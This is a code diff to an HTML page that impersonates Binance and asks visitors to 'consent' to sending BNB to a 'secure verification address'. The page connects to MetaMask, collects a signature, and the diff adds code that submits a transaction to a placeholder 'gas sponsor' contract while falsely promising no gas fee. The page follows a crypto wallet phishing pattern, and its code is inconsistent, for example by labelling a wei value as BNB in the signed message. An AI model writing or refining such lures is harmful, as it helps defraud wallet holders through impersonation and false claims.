@@ -1,7 +1,8 @@
-<!-- index.html -->
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>Gasless BNB Transaction Consent</title>
   <script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script>
 </head>
@@ -10,12 +11,13 @@
   <p>
     Binance requires your consent to send <b>0.0000000001 BNB</b> to our secure verification address
     <br><code>0x0d4eFb6dfF647912Bb7B29Ed3a0e1E8f6E4c297a</code>
-    <br>This transaction will not cost any gas fee for you.
+    <br>This transaction will not cost any gas fee for you. Gas fees will be covered by a sponsor.
   </p>
   <button onclick="connectAndSign()">Give Consent</button>
 
   <script>
     const receiver = "0x0d4eFb6dfF647912Bb7B29Ed3a0e1E8f6E4c297a";
+    const gasSponsor = "0xYourGasSponsorContractAddress";  // Replace with your gas sponsor contract address
 
     async function connectAndSign() {
       if (!window.ethereum) return alert("Please install MetaMask first.");
@@ -37,23 +39,39 @@
       }
 
       // 3. Define the amount
-      const amountBNB = "0.0000000001";
-      const message = `I approve sending ${amountBNB} BNB to ${receiver} for verification purposes.`;
+      const amountBNB = web3.utils.toWei("0.0000000001", 'ether'); // Ensure the amount is in wei
 
       // 4. Sign the consent message
+      const message = `I approve sending ${amountBNB} BNB to ${receiver} for verification purposes.`;
       const signature = await web3.eth.personal.sign(message, sender);
 
-      // 5. Store for submit.html
+      // 5. Prepare transaction data
       const txData = {
         from: sender,
-        to: receiver,
-        value: amountBNB,
-        message,
-        signature
+        to: gasSponsor,  // Send to the gas sponsor contract
+        value: amountBNB, // Send 0.0000000001 BNB to the receiver
+        data: web3.eth.abi.encodeFunctionCall(
+          {
+            name: "sendTransactionWithGasSponsor",  // Assume this is a function in your gas sponsor contract
+            type: "function",
+            inputs: [
+              { type: "address", name: "receiver" },
+              { type: "uint256", name: "amount" },
+              { type: "bytes", name: "signature" }
+            ]
+          },
+          [receiver, amountBNB, signature]
+        )
       };
 
-      localStorage.setItem("tx_data", JSON.stringify(txData));
-      window.location.href = "submit.html";
+      // 6. Send the transaction using MetaMask with gas fee covered by sponsor
+      try {
+        await web3.eth.sendTransaction(txData);
+        alert("Transaction submitted successfully!");
+      } catch (err) {
+        console.error("Error submitting transaction:", err);
+        alert("There was an error submitting the transaction.");
+      }
     }
   </script>
 </body>
